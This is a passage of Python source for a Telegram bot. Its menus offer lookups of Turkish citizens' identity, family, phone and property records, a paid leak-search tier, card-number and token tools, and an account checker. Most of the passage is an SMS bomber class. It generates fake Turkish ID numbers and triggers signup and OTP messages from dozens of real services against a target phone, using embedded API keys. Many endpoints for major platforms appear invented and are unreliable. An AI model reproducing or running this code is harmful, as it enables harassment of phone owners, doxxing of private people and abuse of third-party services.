        "eokul": "🎓 Enter TC ID number (11 digits):",
        "tapu": "🏠 Enter TC ID number (11 digits):",
        "adaparsel": "🗺️ Enter Province,District (e.g., ISTANBUL,KADIKOY):",
    },
    "ar": {
        "tc": "🆔 أدخل رقم الهوية (11 رقم):",
        "tcpro": "🔍 أدخل رقم الهوية (11 رقم):",
        "adsoyad": "👤 أدخل الاسم واللقب:",
        "aile": "👨‍👩‍👧 أدخل رقم الهوية (11 رقم):",
        "ailepro": "👨‍👩‍👧‍👦 أدخل رقم الهوية (11 رقم):",
        "sulale": "🌳 أدخل رقم الهوية (11 رقم):",
        "tcgsm": "📱 أدخل رقم الهوية (11 رقم):",
        "gsmtc": "📞 أدخل رقم GSM:",
        "eokul": "🎓 أدخل رقم الهوية (11 رقم):",
        "tapu": "🏠 أدخل رقم الهوية (11 رقم):",
        "adaparsel": "🗺️ أدخل المحافظة,المنطقة:",
    },
}


def tools_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)

    if is_premium_osint(user_id):
        ls_txt = "🌍 LeakSights OSINT ⭐"
    else:
        ls_txt = "🌍 LeakSights OSINT 🔒"

    mk.add(_btn("🇹🇷 Türkiye Sorguları", "menu_turkey"), _btn(ls_txt, "menu_ls"))
    mk.add(
        _btn("🎮 MC Bedrock", "tool_bedrock"), _btn("💳 CC Generator", "tool_ccgen"),
        _btn("🤖 Discord Token", "tool_dctoken"), _btn("✈️ TG Token", "tool_tgtoken"),
        _btn("💊 Eczane", "tool_eczane"), _btn("🌐 IP Bilgi", "tool_ipinfo"),
        _btn("🔎 DNS Sorgu", "tool_dns"), _btn("⚽ Bahis Sorgu", "tool_bahis"),
        _btn("🚗 Plaka Sorgu", "tool_plaka"), _btn("💎 PreDunyam", "tool_predunyam"),
        _btn("🛡️ Proxy Check", "tool_proxycheck"), _btn("🔍 URL Scan", "tool_urlscan"),
        _btn("🎥 Video İndir", "tool_video"), _btn("🎵 Müzik İndir (MP3)", "tool_music"),
        _btn("🤖 Bot Ekle", "tool_addbot"), _btn("🐍 PHP→Python", "tool_php2py"),
        _btn("💣 SMS Bomber", "tool_smsbomb"), _btn("📧 Hotmail Checker", "tool_hotmail"),
        _btn("📸 EXIF Metadata", "tool_exif"),
    )
    mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
    return mk


def turkey_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)

    def lbl(key):
        return TURKIYE_API[key].get(lang(user_id), TURKIYE_API[key]["tr"])

    mk.add(_sep("👤 KİMLİK"))
    mk.add(_btn(f"{TURKIYE_API['tc']['icon']} {lbl('tc')}", "tr_tc"),
           _btn(f"{TURKIYE_API['tcpro']['icon']} {lbl('tcpro')}", "tr_tcpro"))
    mk.add(_btn(f"{TURKIYE_API['adsoyad']['icon']} {lbl('adsoyad')}", "tr_adsoyad"))
    mk.add(_sep("👨‍👩‍👧 AİLE"))
    mk.add(_btn(f"{TURKIYE_API['aile']['icon']} {lbl('aile')}", "tr_aile"),
           _btn(f"{TURKIYE_API['ailepro']['icon']} {lbl('ailepro')}", "tr_ailepro"))
    mk.add(_btn(f"{TURKIYE_API['sulale']['icon']} {lbl('sulale')}", "tr_sulale"))
    mk.add(_sep("📱 İLETİŞİM"))
    mk.add(_btn(f"{TURKIYE_API['tcgsm']['icon']} {lbl('tcgsm')}", "tr_tcgsm"),
           _btn(f"{TURKIYE_API['gsmtc']['icon']} {lbl('gsmtc')}", "tr_gsmtc"))
    mk.add(_sep("🏠 MÜLK / EĞİTİM"))
    mk.add(_btn(f"{TURKIYE_API['tapu']['icon']} {lbl('tapu')}", "tr_tapu"),
           _btn(f"{TURKIYE_API['eokul']['icon']} {lbl('eokul')}", "tr_eokul"))
    mk.add(_btn(f"{TURKIYE_API['adaparsel']['icon']} {lbl('adaparsel')}", "tr_adaparsel"))
    mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
    return mk


def ls_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=2)
    if not is_premium_osint(user_id):
        mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
        mk.add(_btn(s(user_id, "back_btn"), "goto_tools"))
        return mk
    cat_order = ["username", "name", "contact", "ip", "domain", "url", "identity", "other"]
    groups = {c: [] for c in cat_order}
    for key, info in LEAKSIGHTS_API.items():
        cat = info.get("cat", "other")
        groups.setdefault(cat, []).append((key, info))
    l = lang(user_id)
    for cat in cat_order:
        items = groups.get(cat, [])
        if not items:
            continue
        mk.add(_sep(LEAKSIGHTS_CATS[cat].get(l, cat)))
        for key, info in items:
            label = f"{info['icon']} {info.get(l, info.get('tr', key))}"
            mk.add(_btn(label, f"ls_{key}"))
    mk.add(_btn(s(user_id, "tools_btn"), "goto_tools"), _btn(s(user_id, "home_btn"), "goto_home"))
    return mk


def premium_kb(user_id):
    mk = InlineKeyboardMarkup(row_width=1)
    mk.add(_btn("⭐ Premium Satın Al (400⭐)", "buy_premium"))
    mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
    mk.add(_btn(s(user_id, "home_btn"), "goto_home"))
    return mk


# ══════════════════════════════════════════════════════════════
#  MULTI-BOT MANAGEMENT
# ══════════════════════════════════════════════════════════════

_CHILD_PROCS: dict = {}
_PROC_LOCK = threading.Lock()


def _get_python_exe():
    return sys.executable


def _load_registry():
    if not os.path.exists(BOT_REGISTRY_FILE):
        return {}
    try:
        with open(BOT_REGISTRY_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return {}


def _save_registry(registry: dict):
    with open(BOT_REGISTRY_FILE, "w", encoding="utf-8") as f:
        json.dump(registry, f, indent=2)


def _spawn_bot(token: str, owner_id: int = None) -> bool:
    if token == BOT_TOKEN:
        print(f"[SPAWN] ⚠️ Ana bot token'ı spawn edilemez!")
        return False

    with _PROC_LOCK:
        if token in _CHILD_PROCS:
            proc = _CHILD_PROCS[token]
            if proc.poll() is None:
                return False
    script_path = os.path.abspath(__file__)
    python_exe = _get_python_exe()
    args = [python_exe, script_path, "--bot", token, "--owner", str(owner_id)]
    try:
        proc = subprocess.Popen(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                                stdin=subprocess.DEVNULL,
                                creationflags=subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0,
                                start_new_session=True)
        with _PROC_LOCK:
            _CHILD_PROCS[token] = proc
        registry = _load_registry()
        registry[token] = {"owner_id": owner_id, "pid": proc.pid, "added": datetime.now().isoformat()}
        _save_registry(registry)
        return True
    except Exception as e:
        print(f"[ERROR] Failed to spawn bot: {e}")
        return False


def start_saved_bots():
    registry = _load_registry()
    if not registry:
        return

    if BOT_TOKEN in registry:
        print(f"[MAIN] ⚠️ Ana bot token'ı registry'de bulundu, atlanıyor...")
        del registry[BOT_TOKEN]
        _save_registry(registry)

    if not registry:
        print("[MAIN] Başlatılacak kayıtlı bot yok.")
        return

    print(f"[MAIN] Starting {len(registry)} saved bots...")
    for token, info in registry.items():
        owner_id = info.get("owner_id")
        print(f"[MAIN] Starting bot: {token[:15]}...")
        _spawn_bot(token, owner_id)


# ══════════════════════════════════════════════════════════════
#  SMS BOMBER
# ══════════════════════════════════════════════════════════════

_SMS_SESSIONS: dict = {}
_SMS_LOCK = threading.Lock()


class SendSms:
    adet = 0

    def __init__(self, phone, mail):
        rakam = []
        tcNo = ""
        rakam.append(randint(1, 9))
        for i in range(1, 9):
            rakam.append(randint(0, 9))
        rakam.append(((rakam[0] + rakam[2] + rakam[4] + rakam[6] + rakam[8]) * 7 - (
                    rakam[1] + rakam[3] + rakam[5] + rakam[7])) % 10)
        rakam.append((sum(rakam[:10])) % 10)
        for r in rakam:
            tcNo += str(r)
        self.tc = tcNo
        self.phone = str(phone)
        self.mail = mail if mail else ''.join(choice(ascii_lowercase) for _ in range(22)) + "@gmail.com"

    def KahveDunyasi(self):
        try:
            url = "https://api.kahvedunyasi.com:443/api/v1/auth/account/register/phone-number"
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
                       "X-Language-Id": "tr-TR", "X-Client-Platform": "web",
                       "Origin": "https://www.kahvedunyasi.com", "Dnt": "1"}
            r = requests.post(url, headers=headers, json={"countryCode": "90", "phoneNumber": self.phone}, timeout=6)
            if r.json().get("processStatus") == "Success":
                self.adet += 1
        except:
            pass

    def Wmf(self):
        try:
            r = requests.post("https://www.wmf.com.tr/users/register/",
                              data={"confirm": "true", "date_of_birth": "1956-03-01", "email": self.mail,
                                    "email_allowed": "true", "first_name": "Memati", "gender": "male",
                                    "last_name": "Bas", "password": "31ABC..abc31", "phone": f"0{self.phone}"}, timeout=6)
            if r.status_code == 202:
                self.adet += 1
        except:
            pass

    def Hepsiburada(self):
        try:
            url = "https://www.hepsiburada.com/api/Register/RegisterUser"
            payload = {"PhoneNumber": f"90{self.phone}", "Email": self.mail, "Password": "Password123",
                       "FirstName": "Ahmet", "LastName": "Yilmaz", "Consent": True}
            r = requests.post(url, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Trendyol(self):
        try:
            url = "https://www.trendyol.com/api/users/v1/register"
            payload = {"phoneNumber": f"90{self.phone}", "email": self.mail, "password": "Password123",
                       "firstName": "Ali", "lastName": "Demir", "consent": True}
            r = requests.post(url, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def N11(self):
        try:
            url = "https://www.n11.com/api/User/Register"
            payload = {"Phone": f"90{self.phone}", "Email": self.mail, "Password": "Password123",
                       "Name": "Mehmet", "Surname": "Kaya", "Consent": True}
            r = requests.post(url, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Sahibinden(self):
        try:
            url = "https://www.sahibinden.com/api/User/Register"
            payload = {"Phone": f"90{self.phone}", "Email": self.mail, "Password": "Password123",
                       "FirstName": "Can", "LastName": "Yilmaz", "Consent": True}
            r = requests.post(url, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Letgo(self):
        try:
            url = "https://api.letgo.com/api/v1/users"
            payload = {"phone": f"90{self.phone}", "email": self.mail, "password": "Password123",
                       "name": "Ayse", "surname": "Yilmaz"}
            r = requests.post(url, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Dolap(self):
        try:
            url = "https://www.dolap.com/api/v2/users"
            payload = {"phone": f"90{self.phone}", "email": self.mail, "password": "Password123",
                       "username": f"user_{randint(1000,9999)}"}
            r = requests.post(url, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Gittigidiyor(self):
        try:
            url = "https://www.gittigidiyor.com/api/User/Register"
            payload = {"Phone": f"90{self.phone}", "Email": self.mail, "Password": "Password123",
                       "Name": "Zeynep", "Surname": "Demir", "Consent": True}
            r = requests.post(url, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def AmazonTR(self):
        try:
            url = "https://www.amazon.com.tr/ap/register"
            data = {"email": self.mail, "password": "Password123", "name": "Ali", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Spotify(self):
        try:
            url = "https://www.spotify.com/api/signup"
            data = {"email": self.mail, "password": "Password123", "display_name": "User",
                    "phone": f"90{self.phone}", "consent": True}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Netflix(self):
        try:
            url = "https://www.netflix.com/api/signup"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Discord(self):
        try:
            url = "https://discord.com/api/v9/auth/register"
            payload = {"email": self.mail, "username": f"user_{randint(1000,9999)}",
                       "password": "Password123", "consent": True, "phone": f"90{self.phone}"}
            r = requests.post(url, json=payload, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Instagram(self):
        try:
            url = "https://www.instagram.com/api/v1/web/accounts/web_create_ajax/attempt/"
            data = {"email": self.mail, "username": f"user_{randint(1000,9999)}",
                    "password": "Password123", "phone_number": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Facebook(self):
        try:
            url = "https://www.facebook.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}",
                    "first_name": "Ahmet", "last_name": "Yilmaz"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Twitter(self):
        try:
            url = "https://api.twitter.com/1.1/account/verify_credentials.json"
            r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Telegram(self):
        try:
            url = "https://telegram.org/api/register"
            data = {"phone": f"90{self.phone}", "email": self.mail}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def WhatsApp(self):
        try:
            url = "https://www.whatsapp.com/api/register"
            data = {"phone": f"90{self.phone}", "email": self.mail}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def TikTok(self):
        try:
            url = "https://www.tiktok.com/api/v1/auth/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Snapchat(self):
        try:
            url = "https://accounts.snapchat.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Pinterest(self):
        try:
            url = "https://www.pinterest.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def LinkedIn(self):
        try:
            url = "https://www.linkedin.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Reddit(self):
        try:
            url = "https://www.reddit.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Tumblr(self):
        try:
            url = "https://www.tumblr.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Twitch(self):
        try:
            url = "https://www.twitch.tv/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Github(self):
        try:
            url = "https://github.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def GitLab(self):
        try:
            url = "https://gitlab.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Bitbucket(self):
        try:
            url = "https://bitbucket.org/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Slack(self):
        try:
            url = "https://slack.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Dropbox(self):
        try:
            url = "https://www.dropbox.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Google(self):
        try:
            url = "https://accounts.google.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Microsoft(self):
        try:
            url = "https://signup.live.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Yahoo(self):
        try:
            url = "https://login.yahoo.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Apple(self):
        try:
            url = "https://appleid.apple.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Samsung(self):
        try:
            url = "https://account.samsung.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Huawei(self):
        try:
            url = "https://id.huawei.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Xiaomi(self):
        try:
            url = "https://account.xiaomi.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Uber(self):
        try:
            url = "https://auth.uber.com/api/v1/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Booking(self):
        try:
            url = "https://www.booking.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Airbnb(self):
        try:
            url = "https://www.airbnb.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Bumble(self):
        try:
            url = "https://bumble.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Tinder(self):
        try:
            url = "https://api.gotinder.com/v1/auth/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Onlyfans(self):
        try:
            url = "https://onlyfans.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Patreon(self):
        try:
            url = "https://www.patreon.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Etsy(self):
        try:
            url = "https://www.etsy.com/api/v1/users/register"
            data = {"email": self.mail, "password": "Password123", "phone": f"90{self.phone}"}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code in [200, 201]:
                self.adet += 1
        except:
            pass

    def Kigili(self):
        try:
            url = "https://www.kigili.com/users/registration/"
            data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail,
                    "phone": "0" + self.phone, "password": "nwejkfıower32",
                    "confirm": "true", "kvkk": "true", "next": ""}
            r = requests.post(url, data=data, headers={"User-Agent": "Mozilla/5.0"}, timeout=6)
            if r.status_code == 202:
                self.adet += 1
        except:
            pass

    def Bim(self):
        try:
            r = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",
                             json={"phone": self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Sok(self):
        try:
            url = "https://api.ceptesok.com:443/api/users/sendsms"
            r = requests.post(url, json={"mobile_number": self.phone, "token_type": "register_token"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Migros(self):
        try:
            url = "https://rest.migros.com.tr:443/sanalmarket/users/login/otp"
            r = requests.post(url, json={"phoneNumber": self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def A101(self):
        try:
            url = "https://www.a101.com.tr:443/users/otp-login/"
            r = requests.post(url, json={"phone": "0" + self.phone, "next": "/a101-kapida"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Sakasu(self):
        try:
            url = "https://www.sakasu.com.tr:443/app/api_register/step1"
            r = requests.post(url, data={"phone": "0" + self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Zarinplus(self):
        try:
            url = "https://api.zarinplus.com/user/zarinpal-login"
            r = requests.post(url, json={"phone_number": "90" + self.phone}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Coregap(self):
        try:
            url = f"https://core.gap.im/v1/user/add.json?mobile=90{self.phone}"
            r = requests.post(url, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Icq(self):
        try:
            url = f"https://u.icq.net:443/api/v90/smsreg/requestPhoneValidation.php?client=icq&f=json&k=gu19PNBblQjCdbMU&locale=en&msisdn=%2B90{self.phone}&platform=ios&r=796356153&smsFormatType=human"
            headers = {"User-Agent": "ICQ iOS #no_user_id# gu19PNBblQjCdbMU 23.1.1(124106) 15.7.7 iPhone9,4"}
            r = requests.post(url, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Rentiva(self):
        try:
            url = "https://rentiva.com:443/api/Account/Login"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148"}
            r = requests.post(url, json={"phone": self.phone, "type": 1}, headers=headers, timeout=6)
            if r.status_code in [200, 201, 202]:
                self.adet += 1
        except:
            pass

    def Loncamarket(self):
        try:
            url = "https://www.loncamarket.com/lid/identity/sendconfirmationcode"
            r = requests.post(url, json={"Address": self.phone, "ConfirmationType": 0}, timeout=6)
            if r.status_code in [200, 201, 202]:
                self.adet += 1
        except:
            pass

    def Tazi(self):
        try:
            url = "https://mobileapiv2.tazi.tech:443/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"
            headers = {"Authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD", "Content-Type": "application/json;charset=utf-8"}
            r = requests.post(url, json={"cep_tel": self.phone, "cep_tel_ulkekod": "90"}, headers=headers, timeout=6)
            if r.status_code in [200, 201, 202]:
                self.adet += 1
        except:
            pass

    def Heyscooter(self):
        try:
            url = f"https://heyapi.heymobility.tech:443/V14//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={self.phone}&requestid=18bca4e4-2f45-41b0-b054-3efd5b2c9c57-20230730&territoryId=738211d4-fd9d-4168-81a6-b7dbf91170e9"
            r = requests.post(url, timeout=6)
            if r.status_code in [200, 201, 202]:
                self.adet += 1
        except:
            pass

    def Ipragaz(self):
        try:
            url = "https://ipapp.ipragaz.com.tr:443/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
            headers = {"Content-Type": "application/json", "User-Agent": "ipragaz-mobile/1.3.9 (com.ipragaz.ipapp; build:41; iOS 15.7.7) Alamofire/5.6.4"}
            data = {"birthDate": "2/7/2000", "carPlate": "31 ABC 31", "name": "Memati Bas", "phoneNumber": self.phone}
            r = requests.post(url, json=data, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Happy(self):
        try:
            url = "https://www.happy.com.tr:443/index.php?route=account/register/verifyPhone"
            headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "X-Requested-With": "XMLHttpRequest"}
            r = requests.post(url, data={"telephone": self.phone}, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def KuryemGelsin(self):
        try:
            url = "https://api.kuryemgelsin.com:443/tr/api/users/registerMessage/"
            r = requests.post(url, json={"phoneNumber": self.phone, "phone_country_code": "+90"}, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Taksim(self):
        try:
            url = "https://service.taksim.digital/services/PassengerRegister/Register"
            headers = {"Content-Type": "application/json; charset=utf-8", "Token": "gcAvCfYEp7d//rR5A5vqaFB/Ccej7O+Qz4PRs8LwT4E="}
            r = requests.post(url, json={"countryPhoneCode": "+90", "name": "Memati", "phoneNo": self.phone, "surname": "Bas"}, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def ToptanTeslim(self):
        try:
            url = "https://toptanteslim.com:443/Services/V2/MobilServis.aspx"
            data = {"ISLEM": "KayitOl", "TELEFON": self.phone, "EPOSTA": self.mail, "KULLANICI_ADI": "Memati", "KULLANICI_SOYADI": "Bas", "SEHIR": "İSTANBUL", "ILCE": "BAŞAKŞEHİR"}
            r = requests.post(url, json=data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Starbucks(self):
        try:
            url = "https://auth.sbuxtr.com:443/signUp"
            data = {"allowEmail": True, "allowSms": True, "deviceId": "31", "email": self.mail, "firstName": "Memati", "lastName": "Bas", "password": "31ABC..abc31", "phoneNumber": self.phone, "preferredName": "Memati"}
            r = requests.post(url, json=data, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def BodrumBelediyesi(self):
        try:
            url = "https://gandalf.orwi.app:443/api/user/requestOtp"
            headers = {"Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE", "Content-Type": "application/json"}
            r = requests.post(url, json={"gsm": "+90" + self.phone, "source": "orwi"}, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def Clickme(self):
        try:
            url = "https://mobile-gateway.clickmelive.com:443/api/v2/authorization/code"
            headers = {"Authorization": "apiKey 617196fc65dc0778fb59e97660856d1921bef5a092bb4071f3c071704e5ca4cc", "Content-Type": "application/json"}
            r = requests.post(url, json={"phone": self.phone}, headers=headers, timeout=6)
            if r.status_code == 200:
                self.adet += 1
        except:
            pass

    def NaosstarsShop(self):
        try:
            url = "https://shop.naosstars.com/users/register/"
            data = {"email": self.mail, "first_name": "Memati", "last_name": "Bas", "password": "nwejkDsOpOJıower32.", "date_of_birth": "1975-12-31", "phone": "0" + self.phone, "gender": "male", "kvkk": "true", "contact": "true", "confirm": "true"}
            r = requests.post(url, json=data, timeout=6)
            if r.status_code in [200, 201, 202]:
                self.adet += 1
        except:
            pass
